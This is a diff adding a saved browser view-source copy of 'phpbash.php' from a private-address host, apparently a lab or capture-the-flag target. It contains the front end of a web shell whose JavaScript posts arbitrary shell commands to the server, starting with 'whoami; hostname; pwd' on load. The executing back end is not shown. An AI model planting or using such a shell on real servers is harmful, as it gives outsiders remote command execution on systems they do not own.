@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>http://10.10.10.68/dev/phpbash.php</title><link rel="stylesheet" type="text/css" href="http:_10.10.10.68_dev_phpbash.php_files/viewsource.css"></head><body id="viewsource" class="highlight" style="-moz-tab-size: 4" contextmenu="actions"><pre id="line1"><span>
+<span id="line2"></span></span><span class="error" title="Start tag seen without seeing a doctype first. Expected “&lt;!DOCTYPE html&gt;”.">&lt;<span class="start-tag">html</span>&gt;</span><span>
+<span id="line3"></span>    </span><span>&lt;<span class="start-tag">head</span>&gt;</span><span>
+<span id="line4"></span>        </span><span>&lt;<span class="start-tag">title</span>&gt;</span><span></span><span>&lt;/<span class="end-tag">title</span>&gt;</span><span>
+<span id="line5"></span>        </span><span>&lt;<span class="start-tag">style</span>&gt;</span><span>
+<span id="line6"></span>            body {
+<span id="line7"></span>                width: 100%;
+<span id="line8"></span>                height: 100%;
+<span id="line9"></span>                margin: 0;
+<span id="line10"></span>                background: #000;
+<span id="line11"></span>            }
+<span id="line12"></span>            
+<span id="line13"></span>            body, .inputtext {
+<span id="line14"></span>                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
+<span id="line15"></span>                font-size: 14px;
+<span id="line16"></span>                font-style: normal;
+<span id="line17"></span>                font-variant: normal;
+<span id="line18"></span>                font-weight: 400;
+<span id="line19"></span>                line-height: 20px;
+<span id="line20"></span>                overflow: hidden;
+<span id="line21"></span>            }
+<span id="line22"></span>        
+<span id="line23"></span>            .console {
+<span id="line24"></span>                width: 100%;
+<span id="line25"></span>                height: 100%;
+<span id="line26"></span>                margin: auto;
+<span id="line27"></span>                position: absolute;
+<span id="line28"></span>                color: #fff;
+<span id="line29"></span>            }
+<span id="line30"></span>            
+<span id="line31"></span>            .output {
+<span id="line32"></span>                width: auto;
+<span id="line33"></span>                height: auto;
+<span id="line34"></span>                position: absolute;
+<span id="line35"></span>                overflow-y: scroll;
+<span id="line36"></span>                top: 0;
+<span id="line37"></span>                bottom: 30px;
+<span id="line38"></span>                left: 5px;
+<span id="line39"></span>                right: 0;
+<span id="line40"></span>                line-height: 20px;
+<span id="line41"></span>            }
+<span id="line42"></span>            
+<span id="line43"></span>            .input, .input form, .inputtext {
+<span id="line44"></span>                width: 100%;
+<span id="line45"></span>                height: 30px;
+<span id="line46"></span>                position: absolute;
+<span id="line47"></span>                bottom: 0px;
+<span id="line48"></span>                margin-bottom: 0px;
+<span id="line49"></span>                background: #000;
+<span id="line50"></span>                border: 0;
+<span id="line51"></span>            }
+<span id="line52"></span>            
+<span id="line53"></span>            .input form, .inputtext {
+<span id="line54"></span>                width: 100%;
+<span id="line55"></span>                display: inline-block;
+<span id="line56"></span>            }
+<span id="line57"></span>            
+<span id="line58"></span>            .username {
+<span id="line59"></span>                height: 30px;
+<span id="line60"></span>                width: auto;
+<span id="line61"></span>                padding-left: 5px;
+<span id="line62"></span>                display: inline-block;
+<span id="line63"></span>                line-height: 30px;
+<span id="line64"></span>            }
+<span id="line65"></span>
+<span id="line66"></span>            .input {
+<span id="line67"></span>                border-top: 1px solid #333333;
+<span id="line68"></span>            }
+<span id="line69"></span>            
+<span id="line70"></span>            .inputtext {
+<span id="line71"></span>                padding-left: 8px;
+<span id="line72"></span>                color: #fff;
+<span id="line73"></span>            }
+<span id="line74"></span>            
+<span id="line75"></span>            .inputtext:focus {
+<span id="line76"></span>                outline: none;
+<span id="line77"></span>            }
+<span id="line78"></span>
+<span id="line79"></span>            ::-webkit-scrollbar {
+<span id="line80"></span>                width: 12px;
+<span id="line81"></span>            }
+<span id="line82"></span>
+<span id="line83"></span>            ::-webkit-scrollbar-track {
+<span id="line84"></span>                background: #101010;
+<span id="line85"></span>            }
+<span id="line86"></span>
+<span id="line87"></span>            ::-webkit-scrollbar-thumb {
+<span id="line88"></span>                background: #303030; 
+<span id="line89"></span>            }
+<span id="line90"></span>        </span><span>&lt;/<span class="end-tag">style</span>&gt;</span><span>
+<span id="line91"></span>    </span><span>&lt;/<span class="end-tag">head</span>&gt;</span><span>
+<span id="line92"></span>    </span><span>&lt;<span class="start-tag">body</span>&gt;</span><span>
+<span id="line93"></span>        </span><span>&lt;<span class="start-tag">div</span> <span class="attribute-name">class</span>="<a class="attribute-value">console</a>"&gt;</span><span>
+<span id="line94"></span>            </span><span>&lt;<span class="start-tag">div</span> <span class="attribute-name">class</span>="<a class="attribute-value">output</a>" <span class="attribute-name">id</span>="<a class="attribute-value">output</a>"&gt;</span><span></span><span>&lt;/<span class="end-tag">div</span>&gt;</span><span>
+<span id="line95"></span>            </span><span>&lt;<span class="start-tag">div</span> <span class="attribute-name">class</span>="<a class="attribute-value">input</a>"&gt;</span><span>
+<span id="line96"></span>                </span><span>&lt;<span class="start-tag">div</span> <span class="attribute-name">class</span>="<a class="attribute-value">username</a>" <span class="attribute-name">id</span>="<a class="attribute-value">username</a>"&gt;</span><span></span><span>&lt;/<span class="end-tag">div</span>&gt;</span><span>
+<span id="line97"></span>                </span><span>&lt;<span class="start-tag">form</span> <span class="attribute-name">id</span>="<a class="attribute-value">form</a>" <span class="attribute-name">method</span>="<a class="attribute-value">GET</a>" <span class="attribute-name">onSubmit</span>="<a class="attribute-value">sendCommand()</a>"&gt;</span><span>
+<span id="line98"></span>                    </span><span>&lt;<span class="start-tag">input</span> <span class="attribute-name">class</span>="<a class="attribute-value">inputtext</a>" <span class="attribute-name">id</span>="<a class="attribute-value">inputtext</a>" <span class="attribute-name">type</span>="<a class="attribute-value">text</a>" <span class="attribute-name">name</span>="<a class="attribute-value">cmd</a>" <span class="attribute-name">autocomplete</span>="<a class="attribute-value">off</a>" <span class="attribute-name">autofocus</span>&gt;</span><span>
+<span id="line99"></span>                </span><span>&lt;/<span class="end-tag">form</span>&gt;</span><span>
+<span id="line100"></span>            </span><span>&lt;/<span class="end-tag">div</span>&gt;</span><span>
+<span id="line101"></span>        </span><span>&lt;/<span class="end-tag">div</span>&gt;</span><span>
+<span id="line102"></span>        </span><span>&lt;<span class="start-tag">script</span> <span class="attribute-name">type</span>="<a class="attribute-value">text/javascript</a>"&gt;</span><span>
+<span id="line103"></span>            var username = "";
+<span id="line104"></span>            var hostname = "";
+<span id="line105"></span>            var currentDir = "";
+<span id="line106"></span>            var commandHistory = [];
+<span id="line107"></span>            var currentCommand = 0;
+<span id="line108"></span>            var inputTextElement = document.getElementById('inputtext');
+<span id="line109"></span>            var outputElement = document.getElementById("output");
+<span id="line110"></span>            var usernameElement = document.getElementById("username");
+<span id="line111"></span>            getShellInfo();
+<span id="line112"></span>            
+<span id="line113"></span>            function getShellInfo() {
+<span id="line114"></span>                var request = new XMLHttpRequest();
+<span id="line115"></span>                
+<span id="line116"></span>                request.onreadystatechange = function() {
+<span id="line117"></span>                    if (request.readyState == XMLHttpRequest.DONE) {
+<span id="line118"></span>                        var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
+<span id="line119"></span>                        username = parsedResponse[0];
+<span id="line120"></span>                        hostname = parsedResponse[1];
+<span id="line121"></span>                        currentDir =  parsedResponse[2];
+<span id="line122"></span>                        
+<span id="line123"></span>                        usernameElement.innerHTML = "</span><span>&lt;d</span><span>iv style='color: #ff0000; display: inline;'&gt;"+username+"@"+hostname+"</span><span>&lt;/<span></span>d</span><span>iv&gt;:"+currentDir+"#";
+<span id="line124"></span>                    }
+<span id="line125"></span>                };
+<span id="line126"></span>
+<span id="line127"></span>                request.open("POST", "", true);
+<span id="line128"></span>                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+<span id="line129"></span>                request.send("cmd=whoami; hostname; pwd");
+<span id="line130"></span>            }
+<span id="line131"></span>                        
+<span id="line132"></span>            function sendCommand() {
+<span id="line133"></span>                var request = new XMLHttpRequest();
+<span id="line134"></span>                var command = inputTextElement.value;
+<span id="line135"></span>                var originalCommand = command;
+<span id="line136"></span>                var originalDir = currentDir;
+<span id="line137"></span>                var cd = false;
+<span id="line138"></span>                
+<span id="line139"></span>                commandHistory.push(originalCommand);
+<span id="line140"></span>                switchCommand(commandHistory.length);
+<span id="line141"></span>                inputTextElement.value = "";
+<span id="line142"></span>
+<span id="line143"></span>                var parsedCommand = command.split(" ")[0];
+<span id="line144"></span>                if (parsedCommand == "cd") {
+<span id="line145"></span>                    cd = true;
+<span id="line146"></span>                    command = "cd "+currentDir+"; "+command+"; pwd";
+<span id="line147"></span>                } else if (parsedCommand == "clear") {
+<span id="line148"></span>                    outputElement.innerHTML = "";
+<span id="line149"></span>                    return false;
+<span id="line150"></span>                } else {
+<span id="line151"></span>                    command = "cd "+currentDir+"; " + command;
+<span id="line152"></span>                }
+<span id="line153"></span>                
+<span id="line154"></span>                request.onreadystatechange = function() {
+<span id="line155"></span>                    if (request.readyState == XMLHttpRequest.DONE) {
+<span id="line156"></span>                        if (cd) {
+<span id="line157"></span>                            var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
+<span id="line158"></span>                            currentDir = parsedResponse[parsedResponse.length-2];
+<span id="line159"></span>                            outputElement.innerHTML += "</span><span>&lt;d</span><span>iv style='color:#ff0000; float: left;'&gt;"+username+"@"+hostname+"</span><span>&lt;/<span></span>d</span><span>iv&gt;</span><span>&lt;d</span><span>iv style='float: left;'&gt;"+":"+originalDir+"# "+originalCommand+"</span><span>&lt;/<span></span>d</span><span>iv&gt;</span><span>&lt;b</span><span>r&gt;";
+<span id="line160"></span>                            usernameElement.innerHTML = "</span><span>&lt;d</span><span>iv style='color: #ff0000; display: inline;'&gt;"+username+"</span><span>&lt;/<span></span>d</span><span>iv&gt;:"+currentDir+"#";
+<span id="line161"></span>                        } else {
+<span id="line162"></span>                            outputElement.innerHTML += "</span><span>&lt;d</span><span>iv style='color:#ff0000; float: left;'&gt;"+username+"@"+hostname+"</span><span>&lt;/<span></span>d</span><span>iv&gt;</span><span>&lt;d</span><span>iv style='float: left;'&gt;"+":"+currentDir+"# "+originalCommand+"</span><span>&lt;/<span></span>d</span><span>iv&gt;</span><span>&lt;b</span><span>r&gt;" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "</span><span>&lt;b</span><span>r&gt;");
+<span id="line163"></span>                            outputElement.scrollTop = outputElement.scrollHeight;
+<span id="line164"></span>                        } 
+<span id="line165"></span>                    }
+<span id="line166"></span>                };
+<span id="line167"></span>
+<span id="line168"></span>                request.open("POST", "", true);
+<span id="line169"></span>                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+<span id="line170"></span>                request.send("cmd="+command);
+<span id="line171"></span>                return false;
+<span id="line172"></span>            }
+<span id="line173"></span>            
+<span id="line174"></span>            document.onkeydown = checkForArrowKeys;
+<span id="line175"></span>
+<span id="line176"></span>            function checkForArrowKeys(e) {
+<span id="line177"></span>                e = e || window.event;
+<span id="line178"></span>
+<span id="line179"></span>                if (e.keyCode == '38') {
+<span id="line180"></span>                    //up
+<span id="line181"></span>                    previousCommand();
+<span id="line182"></span>                } else if (e.keyCode == '40') {
+<span id="line183"></span>                    //down
+<span id="line184"></span>                    nextCommand();
+<span id="line185"></span>                }
+<span id="line186"></span>            }
+<span id="line187"></span>            
+<span id="line188"></span>            function previousCommand() {
+<span id="line189"></span>                if (currentCommand != 0) {
+<span id="line190"></span>                    switchCommand(currentCommand-1);
+<span id="line191"></span>                }
+<span id="line192"></span>            }
+<span id="line193"></span>            
+<span id="line194"></span>            function nextCommand() {
+<span id="line195"></span>                if (currentCommand != commandHistory.length) {
+<span id="line196"></span>                    switchCommand(currentCommand+1);
+<span id="line197"></span>                }
+<span id="line198"></span>            }
+<span id="line199"></span>            
+<span id="line200"></span>            function switchCommand(newCommand) {
+<span id="line201"></span>                currentCommand = newCommand;
+<span id="line202"></span>
+<span id="line203"></span>                if (currentCommand == commandHistory.length) {
+<span id="line204"></span>                    inputTextElement.value = "";
+<span id="line205"></span>                } else {
+<span id="line206"></span>                    inputTextElement.value = commandHistory[currentCommand];
+<span id="line207"></span>                    setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
+<span id="line208"></span>                }
+<span id="line209"></span>            }
+<span id="line210"></span>            
+<span id="line211"></span>            document.getElementById("form").addEventListener("submit", function(event){
+<span id="line212"></span>                event.preventDefault()
+<span id="line213"></span>            });
+<span id="line214"></span>        </span><span>&lt;/<span class="end-tag">script</span>&gt;</span><span>
+<span id="line215"></span>    </span><span>&lt;/<span class="end-tag">body</span>&gt;</span><span>
+<span id="line216"></span></span><span>&lt;/<span class="end-tag">html</span>&gt;</span><span></span></pre><menu type="context" id="actions"><menuitem id="goToLine" label="Go to Line…" accesskey="L"></menuitem><menuitem id="wrapLongLines" label="Wrap Long Lines" type="checkbox"></menuitem><menuitem id="highlightSyntax" label="Syntax Highlighting" type="checkbox" checked="true"></menuitem></menu></body></html>
